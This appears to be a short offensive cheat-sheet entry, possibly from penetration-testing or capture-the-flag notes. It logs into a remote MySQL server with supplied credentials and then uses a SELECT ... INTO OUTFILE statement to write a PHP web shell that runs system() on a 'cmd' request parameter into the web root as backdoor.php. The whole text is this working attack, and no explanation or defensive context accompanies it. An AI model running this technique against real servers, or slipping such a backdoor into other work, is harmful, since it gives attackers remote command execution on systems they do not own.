mysql --ssl-skip -u $USER -p$PASS -h $RHOST

SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “/var/www/WEROOT/backdoor.php”;